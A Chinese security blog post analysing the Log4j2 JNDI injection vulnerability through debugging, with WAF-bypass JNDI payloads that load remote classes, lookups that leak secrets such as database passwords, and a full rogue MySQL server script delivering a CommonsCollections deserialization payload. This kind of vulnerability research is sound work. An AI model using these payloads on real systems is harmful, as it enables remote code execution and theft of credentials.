## ​前言

Apache
Log4j2是一款优秀的Java日志框架，最近爆出了一个jndi注入的漏洞，影响面非常广，各大厂商都被波及。Log4j2作为日志记录的第三方库，被广泛得到使用，这次主要分享一下，最近的一些调试记录。

## JNDI简介

JNDI 全称为 **Java Naming and Directory Interface** ，即 Java
名称与目录接口。本质上就是一个接口，ND代表的Naming 和 Directory，分别代表 **Naming Service(名称服务)** 和
**Directory Service(目录服务)。** 参考JNDI 注入漏洞的前世今生

 **名称服务** 就是 **通过名称查找实际对象的服务，例如：通过域名寻找ip地址即DNS服务、文件系统、以及LDAP（** Lightweight
Directory Access Protocol **）** 即轻量级目录访问协议 **都是名称服务，不同的是LDAP(**
RFC2251(RFC4511) **)是一个协议，是和HTTP一样是通用的，而不止局限于JAVA.目录服务**
是名称服务的一种拓展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性(attributes)信息。由此，我们不仅可以根据名称去查找(lookup)对象(并获取其对应属性)，还可以根据属性值去搜索(search)对象。目录服务也是一种特殊的名称服务，关键区别是在目录服务中通常使用搜索(search)操作去定位对象，而不是简单的根据名称查找(lookup)去定位。

JNDI 架构上主要包含两个部分，即 Java 的应用层接口和 SPI，SPI 全称为 Service Provider
Interface，即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装，如下图所示:![1640573882_61c92bbabe7aecd31c29b.png!small](https://image.3001.net/images/20211227/1640573882_61c92bbabe7aecd31c29b.png!small)

如上JNDI为不同的目录服务提供统一的操作接口

JDK 中包含了下述内置的目录服务:

> RMI: Java Remote Method Invocation，Java 远程方法调用；
>
> LDAP: 轻量级目录访问协议；
>
> CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS
> 名称服务(Common Object Services)；

### RMI

RMI(Remote Method Invocation)即java的远程方法调用，Java
RMI是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法并获取执行结果，即JAVA的RPC机制。关于RMI需要注意以下两点：

>   1. RMI的传输是基于反序列化的；
>
>   2.
> 对于任何一个以对象为参数的RMI接口，你都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于服务端classpath（不在classpath的情况，可以看后面RMI动态加载类相关部分）中的可序列化类来反序列化恢复对象。
>
>

更多可以参考：https://paper.seebug.org/1091/#java-rmi_1

### LDAP

LDAP即是JNDI SPI支持的Service Provider之一，但同时也是协议。是早期 X.500 DAP (目录访问协议)
的一个子集，因此有时也被称为 **X.500-lite。**
LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。

LDAP
的目录信息是以树形结构进行存储的，在树根一般定义国家（c=CN）或者域名（dc=com），其次往往定义一个或多个组织（organization，o）或组织单元（organization
unit，ou）。一个组织单元可以包含员工、设备信息（计算机/打印机等）相关信息。

一些定义：![1640573919_61c92bdf7f3e00e1d91a7.png!small](https://image.3001.net/images/20211227/1640573919_61c92bdf7f3e00e1d91a7.png!small)

## 漏洞环境

    
    
    pom.xml<?xml version="1.0" encoding="UTF-8"?><project xmlns="http://maven.apache.org/POM/4.0.0"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"><modelVersion>4.0.0</modelVersion><groupId>org.example</groupId><artifactId>log4j-test</artifactId><version>1.0-SNAPSHOT</version><dependencies><dependency><groupId>org.apache.logging.log4j</groupId><artifactId>log4j-api</artifactId><version>2.9.0</version></dependency><dependency><groupId>org.apache.logging.log4j</groupId><artifactId>log4j-core</artifactId><version>2.9.0</version></dependency></dependencies></project>log4jTest.javaimport org.apache.logging.log4j.LogManager;public class log4jTest {//获取日志记录器Logger，名字为本类类名private static final Logger logger = LogManager.getLogger();public static void main(String[] args) {for(int i=0;i<2;i++){logger.error("${jndi:ldap://$xxxx}");}}}

## 漏洞分析

### 产生原因

Log4j2默认提供了Lookups功能，查找提供了一种在任意位置向 Log4j
配置添加值的方法。它们是实现StrLookup接口的特定类型的插件。其中包括了对JNDI

Lookup的支持，但是却未对传入内容进行任何限制，导致攻击者可以JNDI注入，远程加载恶意类到应用中，从而RCE。

### 流程分析

这里使用idea进行动态调试。

首先f7跟进error方法：![1640573935_61c92bef004e39602ea69.png!small](https://image.3001.net/images/20211227/1640573935_61c92bef004e39602ea69.png!small)

到达isEnabled，这里有个限制就是log
的level等级必须大于或等于配置的level，在测试的几个版本中，不配置的情况下默认为ERROR，所以info之类的很多无法触发漏洞，log4j2中，
共有8个级别，从低到高为：ALL <TRACE <DEBUG <INFO <WARN <ERROR <FATAL
<OFF。![1640573944_61c92bf8115aa9e387d4b.png!small](https://image.3001.net/images/20211227/1640573944_61c92bf8115aa9e387d4b.png!small)

在

    
    
    org.apache.logging.log4j.core.pattern.MessagePatternConverter \#format

处会对this.config和this.noLookups进行判断，然后循环读取，当遇到${

就会触发

    
    
    config.getStrSubstitutor().replace(event, value)

对value进行进一步的格式化处理。

![1640573955_61c92c0329f807a7ced43.png!small](https://image.3001.net/images/20211227/1640573955_61c92c0329f807a7ced43.png!small)

跟进replace函数：

![1640573967_61c92c0f8afde6bab42a7.png!small](https://image.3001.net/images/20211227/1640573967_61c92c0f8afde6bab42a7.png!small)

继续跟进substitute函数，这里主要是递归去处理我们传入的内容，其中prefixMatcher和suffixMatcher分别匹配${和}。

![1640573974_61c92c16a1937fb2785cc.png!small](https://image.3001.net/images/20211227/1640573974_61c92c16a1937fb2785cc.png!small)

配置到${和}之后，就会把括号内的值赋给varName：

![1640573982_61c92c1e3b4705464116f.png!small](https://image.3001.net/images/20211227/1640573982_61c92c1e3b4705464116f.png!small)

![1640573991_61c92c27d8db1dac96f3e.png!small](https://image.3001.net/images/20211227/1640573991_61c92c27d8db1dac96f3e.png!small)

在374行会varName会作为参数传给resolveVariable：

![1640574000_61c92c302ebccad2eab96.png!small](https://image.3001.net/images/20211227/1640574000_61c92c302ebccad2eab96.png!small)

![1640574007_61c92c37f25d1f025da6c.png!small](https://image.3001.net/images/20211227/1640574007_61c92c37f25d1f025da6c.png!small)

然后一路跟下去，resolveVariable方法这里则直接根据不同的协议选择相应的lookup逻辑进行解析执行，通过log4j-core
自带的JndiLookup进行处理JNDI URL， getVariableResolver()获取支持的协议{date, ctx, main, sys,
env, sd, java, marker, jndi, jvmrunargs, bundle, map,
log4j}，不同的版本支持的协议略有不同，比如2.14.1支持的是{date, java, marker, ctx, lower, upper,
jndi, main, jvmrunargs, sys, env, log4j}，所以2.15.0 rc1一些waf绕过也不是通用的。

![1640574017_61c92c41e5a2e92b100a2.png!small](https://image.3001.net/images/20211227/1640574017_61c92c41e5a2e92b100a2.png!small)

最终在jndiManager类，用java原生的javax.naming.InitialContext.lookup
去访问，这一步是经典的JNDI注入，从而造成RCE。

![1640574027_61c92c4b705592d4fcc05.png!small](https://image.3001.net/images/20211227/1640574027_61c92c4b705592d4fcc05.png!small)

### WAF 绕过

由于整个处理过程是递归进行的，遇到${}就会处理一次，最后会把处理好的内容拼接在一起，然后传值给resolveVariable方法，然后根据不同的协议进行进入相应的lookup方法，并且还内置一些分隔符的处理逻辑，例如：":-"，造成一些绕过。

![1640574036_61c92c542a6fdd3e6a252.png!small](https://image.3001.net/images/20211227/1640574036_61c92c542a6fdd3e6a252.png!small)

可以构造这样的payload：

    
    
    ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/Exploit.class}

当匹配到":-"会进行下面的处理，会把匹配${}转化为字符数组，然后对这个数组进行遍历，遇到":-"就会使用substring函数把":-"之前的内容包括给":-"截掉，这里":-"不分先后，例如"-:",因为是作为一个数组匹配的，只要在一起就行。所以便有了千奇百怪的绕waf手法。

![1640574045_61c92c5d2eaf57e8acfc4.png!small](https://image.3001.net/images/20211227/1640574045_61c92c5d2eaf57e8acfc4.png!small)

substitute会递归处理每一个${}，第一轮"::-j"会被换为"j"。

![1640574053_61c92c654579bec1c5288.png!small](https://image.3001.net/images/20211227/1640574053_61c92c654579bec1c5288.png!small)

所以还可以用lower, upper等支持的协议进行一些绕过，例如：

    
    
    ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}

但是部分版本支持的协议不太一样，这点需要注意一下。部分版本不支持lower, upper等协议，例如：2.9.0

![1640574062_61c92c6e4dae4aaf757d9.png!small](https://image.3001.net/images/20211227/1640574062_61c92c6e4dae4aaf757d9.png!small)

#### 外带敏感信息

在不能RCE的情况下，可以通过dnslog等方式外带一些敏感信息，例如

${hostName}

${sys:user.dir}

${sys:java.version}

${java:os}

.........

更多可以参考官方的https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html#JndiLookup支持的协议用法

@浅蓝师傅发现了危害更大一种利用方式，就是利用Bundle协议读取项目配置文件来获取敏感信息，例如读取 springboot
的application.properties 配置文件获取 redis、mysql 的配置项等敏感信息：

    
    
    ${bundle:application:spring.datasource.password}

#### RCE的一些限制

JNDI注入有很多种不同的利用pyload，但是都存在一些限制条件。

JDK 中默认支持的 JNDI 自动协议转换以及对应的工厂类如下所示:

![1640574075_61c92c7b37120d6b9b0e7.png!small](https://image.3001.net/images/20211227/1640574075_61c92c7b37120d6b9b0e7.png!small)

##### RMI

从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly
的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase
指定路径加载类文件。从JDK 6u132, JDK 7u122, JDK 8u113 中Java提升了JNDI
限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性
com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase
的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。

##### LDAP

2018年10月，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK
11.0.1、8u191、7u201、6u211之后com.sun.jndi.ldap.object.trustURLCodebase
属性的默认值被调整为false，

手动开启上面的属性，可以通过代码实现，如下：

    
    
    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");  
      
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

##### 绕过JDK版本限制

绕过一般需要利用受害者CLASSPATH的类，依赖于本地的Gadget，常用的有下面两种手法：

  1. 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。

  2. 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。

第一种绕过手法常用的是org.apache.naming.factory.BeanFactory这个类，因为它存在于Tomcat依赖包中，所以应用比较广泛。org.apache.naming.factory.BeanFactory
在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean
Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。

第二种绕过手法需要利用一个本地的反序列化利用链（如CommonsCollections），然后可以结合Fastjson等漏洞入口点和JdbcRowSetImpl进行组合利用。

### log4j1.x有限制的RCE

log4j 1.x
已停产，不会发布修复版本。目前大多使用的都是log4j2.x,但是还有少部分老旧业务使用的是1.x。这里的利用方式，比较鸡肋，所以只是记录一下，结合MySQL
JDBC的利用方式。这里跟JNDI没啥关系。

#### 环境搭建

    
    
    log4j.propertieslog4j.rootLogger=DEBUG,database log4j.appender.database=org.apache.log4j.jdbc.JDBCAppender  #数据库地址log4j.appender.database.URL=jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor  log4j.appender.database.driver=com.mysql.jdbc.Driver  log4j.appender.database.user=rootlog4j.appender.database.password=rootlog4j.appender.database.sql=INSERT INTO log4j (message) VALUES('%d{yyyy-MM-dd HH:mm:ss} [%5p] - %c - %m%n')  #log4j.appender.database.layout=org.apache.log4j.PatternLayoutlog4j.propertieslog4j.propertiespom.xml<?xml version="1.0" encoding="UTF-8"?><project xmlns="http://maven.apache.org/POM/4.0.0"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"><modelVersion>4.0.0</modelVersion><groupId>org.example</groupId><artifactId>log4j-test</artifactId><version>1.0-SNAPSHOT</version><dependencies><dependency><groupId>log4j</groupId><artifactId>log4j</artifactId><version>1.2.17</version></dependency><dependency><groupId>commons-collections</groupId><artifactId>commons-collections</artifactId><version>3.2.1</version></dependency><dependency><groupId>mysql</groupId><artifactId>mysql-connector-java</artifactId><version>8.0.12</version></dependency></dependencies></project>log4jTest.javaimport org.apache.log4j.Logger;import javax.naming.NamingException;public class log4jTest {//获取日志记录器Logger，名字为本类类名public static void main(String[] args) throws NamingException {//PropertyConfigurator.configure ("/Users/panda/Downloads/log4jDemo/src/main/resources/log4j.properties");Logger logger = Logger.getLogger(log4jTest.class);logger.error("error");}}

### 漏洞分析

#### 知识点

##### JDBC简介

JDBC是Java DataBase
Connectivity的缩写，它是Java程序访问数据库的标准接口。使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。

常用配置格式：

  

![1640574093_61c92c8d24d7f352590ad.png!small](https://image.3001.net/images/20211227/1640574093_61c92c8d24d7f352590ad.png!small)

##### MYSQL JDBC反序列化漏洞原理

BlackHat Europe 2019 的议题《New Exploit Technique In Java Deserialization
Attack》公布了MYSQL JDBC的反序列化利用链，原理是在使用MYSQL JDBC连接数据库的时候，会执行几个内置的sql查询语句，其中SHOW
SESSION STATUS和SHOW
COLLATION两个查询的结果集在MySQL客户端被处理时会调用ObjectInputStream.readObject()进行反序列化操作,如果攻击者搭建恶意MySQL服务器来控制这两个查询的结果集，如果JDBC连接是可控的，那么就能触发MySQL
JDBC客户端反序列化漏洞。(需要 **mysql-java-connector <**8.0.23)。

    
    
    mysql恶意服务器# coding=utf-8import socketimport binasciiimport osgreeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"response_ok_data="0700000200000002000000"def receive_data(conn):data = conn.recv(1024)print("[*] Receiveing the package : {}".format(data))return str(data).lower()def send_data(conn,data):print("[*] Sending the package : {}".format(data))conn.send(binascii.a2b_hex(data))def get_payload_content():#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] > payloadfile= r'payload'if os.path.isfile(file):with open(file, 'rb') as f:payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')print("open successs")else:print("open false")#calcpayload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'return payload_content# 主要逻辑def run():while 1:conn, addr = sk.accept()print("Connection come from {}:{}".format(addr[0],addr[1]))# 1.先发送第一个 问候报文send_data(conn,greeting_data)while True:# 登录认证过程模拟 1.客户端发送request login报文 2.服务端响应response_okreceive_data(conn)send_data(conn,response_ok_data)#其他过程data=receive_data(conn)#查询一些配置信息,其中会发送自己的 版本号if "session.auto_increment_increment" in data:_payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'send_data(conn,_payload)data=receive_data(conn)elif "show warnings" in data:_payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'send_data(conn, _payload)data = receive_data(conn)if "set names" in data:send_data(conn, response_ok_data)data = receive_data(conn)if "set character_set_results" in data:send_data(conn, response_ok_data)data = receive_data(conn)if "show session status" in data:mysql_data = '0100000102'mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'# 为什么我加了EOF Packet 就无法正常运行呢？？# 获取payloadpayload_content=get_payload_content()# 计算payload长度payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)payload_length_hex = payload_length[2:4] + payload_length[0:2]# 计算数据包长度data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hexmysql_data += str(payload_content)mysql_data += '07000005fe000022000100'send_data(conn, mysql_data)data = receive_data(conn)if "show warnings" in data:payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'send_data(conn, payload)breakif __name__ == '__main__':HOST ='0.0.0.0'PORT = 3306sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)sk.bind((HOST, PORT))sk.listen(1)print("start fake mysql server listening on {}:{}".format(HOST,PORT))run()

可以用ysoserial生成CC7的payload，然后运行恶意MySQL服务器进行监听。

例如：

    
    
    java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 calc > payload

![1640574105_61c92c990152b2b615a80.png!small](https://image.3001.net/images/20211227/1640574105_61c92c990152b2b615a80.png!small)

放在mysql服务器的py文件同级目录，并且运行mysq服务器。

![1640574113_61c92ca1ddf94867a01e1.png!small](https://image.3001.net/images/20211227/1640574113_61c92ca1ddf94867a01e1.png!small)

##### 流程分析

log4j三大组件为Logger、Appender、Layout。Logger负责收集处理日志记录，Layout负责日志输出的形式，而Appender负责配置日志的输出位置和方式。

其中Appender可以配置的一种方式为数据库输出(JDBCAppender)，通过JDBC链接把日志输出到数据库中，配置时需要配置JDBC驱动，连接字符串，用户名，密码以及SQL语句。

我们直接把断点打在JDBCAppender.java的getConnection()处，因为这也是MYSQL JDBC反序列化的执行点。

调用链如下：

![1640574126_61c92cae393e4875b482c.png!small](https://image.3001.net/images/20211227/1640574126_61c92cae393e4875b482c.png!small)

成功执行：

![1640574135_61c92cb72cbd77827252f.png!small](https://image.3001.net/images/20211227/1640574135_61c92cb72cbd77827252f.png!small)

![1640574145_61c92cc1330edc435b123.png!small](https://image.3001.net/images/20211227/1640574145_61c92cc1330edc435b123.png!small)

但是正常情况下我们是无法控制log4j的配置文件的，所以是比较鸡肋的，但是一些可以动态配置服务的，例如nacos，也许可以找到利用方式。

![1640574154_61c92cca28178a98a5eb0.png!small](https://image.3001.net/images/20211227/1640574154_61c92cca28178a98a5eb0.png!small)

但是不知道是否支持 **log4j1.x，:)。**

 **参考** :

> https://paper.seebug.org/1091/
>
> https://paper.seebug.org/942/
>
> https://githubmemory.com/repo/Ea3i0n/JNDIExploit
>
> https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html
>
> https://evilpan.com/2021/12/13/jndi-injection/
>
> [https://mp.weixin.qq.com/s/vAE89A5wKrc-> YnvTr0qaNg](https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&mid=2247483945&idx=1&sn=b15b68d95da83bb20f1b3496396f823a&scene=21#wechat_redirect)

